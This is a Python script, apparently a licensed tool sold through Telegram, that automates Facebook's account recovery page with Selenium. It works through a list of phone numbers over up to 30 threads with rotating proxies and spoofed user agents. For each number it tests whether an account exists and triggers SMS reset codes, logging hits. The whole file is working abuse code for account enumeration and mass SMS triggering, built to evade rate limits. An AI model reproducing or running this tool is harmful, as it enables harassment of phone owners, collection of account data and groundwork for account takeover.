import time
import random
import os
import requests
import uuid
from concurrent.futures import ThreadPoolExecutor
from threading import Lock
from colorama import Fore, Style, init
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

init(autoreset=True)

# ================== CONFIG & AUTH ==================
GITHUB_KEY_URL = "https://raw.githubusercontent.com/xmlcreator320-cpu/AKASH-FB/main/keys.txt"

stats = {"total": 0, "success": 0, "no_id": 0, "no_sms": 0, "error": 0}
lock = Lock()
log_count = 0
HEADLESS = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
]

# ================== LICENSE SYSTEM (SUPER PERMANENT) ==================
def check_key():
    # টার্মাক্স স্টোরেজ পারমিশন চেক করা
    sdcard_path = "/sdcard/.akash_id.txt"
    home_path = os.path.join(os.path.expanduser("~"), ".akash_id.txt")
    
    # প্রথমে ফোনের মেইন মেমোরিতে চেক করবে, না থাকলে টার্মাক্স হোমে চেক করবে
    target_path = sdcard_path if os.path.exists("/sdcard") else home_path
    
    if os.path.exists(target_path):
        with open(target_path, "r") as f:
            user_key = f.read().strip()
    else:
        # একদম ফ্রেশ আইডি তৈরি করবে যা আর বদলাবে না
        hwid = str(uuid.uuid4().hex[:6]).upper()
        user_key = f"AKASH-{hwid}"
        try:
            with open(target_path, "w") as f:
                f.write(user_key)
        except:
            # যদি SD Card পারমিশন না থাকে তবে হোমে সেভ করবে
            with open(home_path, "w") as f:
                f.write(user_key)

    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.CYAN + "=" * 60)
    print(f"{Fore.WHITE} YOUR KEY : {Fore.YELLOW}{user_key}")
    
    try:
        # Fresh data fetch
        response = requests.get(f"{GITHUB_KEY_URL}?t={time.time()}", timeout=10)
        active_keys = response.text
        
        if user_key in active_keys:
            print(f"{Fore.WHITE} STATUS   : {Fore.GREEN}ACTIVE")
            print(Fore.CYAN + "=" * 60)
            return True
        else:
            print(f"{Fore.WHITE} STATUS   : {Fore.RED}NOT ACTIVE")
            print(Fore.CYAN + "=" * 60)
            print(f"{Fore.GREEN} Message  : Contact Admin To Activate Key")
            print(f"{Fore.GREEN} Telegram : @akash_bosss")
            input(f"{Fore.YELLOW} Press Enter to Exit...")
            return False
    except:
        print(f"{Fore.RED} [!] Check your internet connection!")
        return False

# ================== বাকি সব আপনার অরিজিনাল কোড ==================
def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.RED + Style.BRIGHT + r"""
  █████╗ ██╗  ██╗ █████╗ ███████╗██╗  ██╗
 ██╔══██╗██║ ██╔╝██╔══██╗██╔════╝██║  ██║
 ███████║█████╔╝ ███████║███████╗███████║
 ██╔══██║██╔═██╗ ██╔══██║╚════██║██╔══██║
 ██║  ██║██║  ██╗██║  ██║███████║██║  ██║
 ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
    """)
    print(Fore.MAGENTA + Style.BRIGHT + "        >>> FB REST TOOLS v2.0 PHONE CLONE <<<")
    print(Fore.CYAN + "=" * 60)
    print(Fore.YELLOW + Style.BRIGHT + " Developer : Akash | TELEGRAM : @akash_bosss")
    print(Fore.CYAN + "=" * 60)

def setup_chrome(proxy=None):
    options = Options()
    if HEADLESS: options.add_argument("--headless=new")
    options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    if proxy: options.add_argument(f'--proxy-server={proxy}')

    if os.name == "nt" or (os.name == "posix" and not os.path.exists("/data/data/com.termux")):
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    else:
        options.binary_location = "/data/data/com.termux/files/usr/bin/chromium"
        driver = webdriver.Chrome(service=Service("/data/data/com.termux/files/usr/bin/chromedriver"), options=options)
    return driver

def log_event(msg, color=Fore.WHITE):
    global log_count
    with lock:
        log_count += 1
        print(f"{color}[{log_count}] {msg}{Style.RESET_ALL}")

def process_number(any_number, proxy=None):
    driver = None
    try:
        driver = setup_chrome(proxy)
        driver.get("https://www.facebook.com/recover/initiate/")
        input_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.XPATH, "//input[@placeholder='Email address or mobile number']")))
        input_field.send_keys(any_number)
        driver.find_element(By.XPATH, "//button[contains(text(),'Search')]").click()
        time.sleep(3)
        page_text = driver.page_source
        if "This is my account" in page_text:
            try:
                driver.find_element(By.XPATH, "//*[normalize-space(text())='This is my account']").click()
                time.sleep(3)
                page_text = driver.page_source
            except: pass
        if "No search results" in page_text:
            log_event(f"{any_number} : Invalid Account", Fore.RED)
            with lock: stats["no_id"] += 1
        elif "Send code via SMS" in page_text or "Try another way" in page_text:
            try:
                sms_btn = WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.XPATH, "//input[contains(@value,'sms')]")))
                driver.execute_script("arguments[0].click();", sms_btn)
                driver.find_element(By.XPATH, "//button[contains(.,'Continue')]").click()
                time.sleep(3)
                if "check your phone" in driver.page_source.lower() or "Enter security code" in driver.page_source:
                    log_event(f"{any_number} : Success Sent", Fore.GREEN)
                    with lock: stats["success"] += 1
                    with open("success_sent.txt", "a") as f: f.write(any_number + "\n")
            except:
                log_event(f"{any_number} : No SMS Option", Fore.YELLOW)
                with lock: stats["no_sms"] += 1
        else:
            log_event(f"{any_number} : Unknown Layout", Fore.RED)
            with lock: stats["error"] += 1
    except:
        with lock: stats["error"] += 1
    finally:
        if driver: driver.quit()

def main():
    if not check_key(): return
    banner()
    if not os.path.exists("numbers.txt"): return
    numbers = [x.strip() for x in open("numbers.txt").readlines() if x.strip()]
    proxies = []
    if os.path.exists("proxy.txt"):
        proxies = [x.strip() for x in open("proxy.txt").readlines() if x.strip()]
    stats["total"] = len(numbers)
    try:
        threads = int(input(Fore.WHITE + "Enter Threads (1-30): "))
        threads = max(1, min(threads, 30))
    except: threads = 5
    global HEADLESS
    HEADLESS = input("Headless Mode? (y/n): ").lower() == 'y'
    use_proxy = input("Use Proxy? (y/n): ").lower() == 'y'
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for num in numbers:
            p = random.choice(proxies) if use_proxy and proxies else None
            executor.submit(process_number, num, p)
    input("\nPress Enter to Exit...")

if __name__ == "__main__":
    main()
